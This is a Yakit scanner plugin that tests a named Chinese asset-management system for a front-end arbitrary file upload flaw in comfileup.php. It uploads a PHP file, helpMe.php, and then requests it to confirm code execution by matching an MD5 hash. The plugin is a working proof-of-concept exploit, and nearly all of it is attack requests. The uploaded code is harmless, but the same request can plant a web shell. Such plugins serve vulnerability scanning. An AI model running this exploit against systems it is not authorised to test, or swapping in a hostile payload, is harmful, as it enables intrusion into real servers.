content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /comfileup.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0)Gecko/20100101 Firefox/127.0
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------1110146050
 
----------1110146050
Content-Disposition: form-data; name="file";filename="helpMe.php"
 
<?php echo(md5("123456")); ?>
----------1110146050--`

	packet2 = `GET /helpMe.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close

`


    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

	time.sleep(1)
	rsp1,req1,_ = poc.HTTP(packet2, 
		poc.params({"target":addr}),
		poc.https(isTls),
		poc.redirectTimes(0),
		)



    if str.MatchAllOfSubString(rsp1, `e10adc3949ba59abbe56e057f20f883e`){
        yakit.Info("%v found 某众合百易信息技术资产管理运营系统 comfileup.php 前台文件上传漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("某众合百易信息技术资产管理运营系统 comfileup.php 前台文件上传漏洞"),
        risk.severity("high"),
        risk.titleVerbose("某众合百易信息技术资产管理运营系统 comfileup.php 前台文件上传漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
		risk.details("根路径访问即可"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
